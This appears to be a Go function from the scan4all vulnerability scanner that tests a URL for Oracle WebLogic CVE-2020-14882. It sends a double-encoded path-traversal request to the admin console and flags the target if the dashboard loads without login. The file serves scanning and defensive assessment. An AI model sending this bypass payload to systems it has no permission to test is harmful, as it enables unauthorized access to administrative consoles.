package weblogic

import (
	"fmt"
	"github.com/hktalent/scan4all/lib/util"
)

func CVE_2020_14882(url string) bool {
	if req, err := util.HttpRequset(url+"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=a", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "/console/dashboard") {
			util.GoPocLog(fmt.Sprintf("Found vuln Weblogic CVE_2020_14882|%s\n", url))
			return true
		}
	}
	return false
}
